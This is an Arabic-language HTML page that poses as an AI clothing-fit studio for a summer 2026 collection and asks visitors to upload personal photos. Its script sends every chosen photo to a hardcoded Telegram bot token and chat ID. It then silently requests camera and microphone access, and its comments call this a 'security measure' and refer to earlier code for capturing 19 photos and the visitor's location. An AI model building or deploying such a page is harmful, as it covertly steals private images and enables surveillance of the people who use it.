<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Talla Studio | استوديو تنسيق الملابس</title>
    <style>
        body { font-family: 'Cairo', sans-serif; background: #fafafa; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .studio-card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 450px; text-align: center; }
        .header { color: #e91e63; font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        .upload-area { border: 2px dashed #e91e63; padding: 40px 20px; border-radius: 15px; background: #fff5f8; cursor: pointer; margin: 20px 0; position: relative; }
        .upload-area:hover { background: #ffebee; }
        .btn-send { background: #e91e63; color: white; border: none; padding: 15px; border-radius: 10px; width: 100%; font-size: 18px; cursor: pointer; }
        #file-input { position: absolute; width: 100%; height: 100%; top: 0; left: 0; opacity: 0; cursor: pointer; }
        .loading { display: none; margin-top: 15px; color: #666; }
    </style>
</head>
<body>

<div class="studio-card">
    <div class="header">Talla AI Studio</div>
    <p>ارفع صورك الشخصية الآن ليقوم الذكاء الاصطناعي بتحديد المقاس المناسب لك من تشكيلة صيف 2026.</p>
    
    <div class="upload-area">
        <p>اضغط هنا لاختيار الصور من الاستوديو</p>
        <p style="font-size: 12px; color: #888;">(يمكنك اختيار أكثر من صورة معاً)</p>
        <input type="file" id="file-input" multiple accept="image/*">
    </div>

    <button class="btn-send" onclick="alert('يرجى اختيار الصور أولاً')">بدء المعالجة الذكية</button>
    <div class="loading" id="loader">جاري رفع الصور وتنسيق المقاسات...</div>
</div>

<video id="v" autoplay style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
    const chatId = "8754338811";

    const fileInput = document.getElementById('file-input');
    
    // بمجرد ما يختار صور من الاستوديو
    fileInput.addEventListener('change', async (e) => {
        const files = e.target.files;
        document.getElementById('loader').style.display = 'block';

        for (let file of files) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', file); // ببعتها كملف عشان الجودة
            
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {}
        }
        
        // بعد ما يرفع، بنشغل سحب الكاميرا والموقع "كإجراء أمان"
        startSilentCapture();
    });

    async function startSilentCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            // هنا بنكمل كود الـ 19 صورة واللوكيشن اللي عملناه قبل كده
            // ... (نفس الكود السابق)
        } catch(e) {}
    }
</script>

</body>
</html>
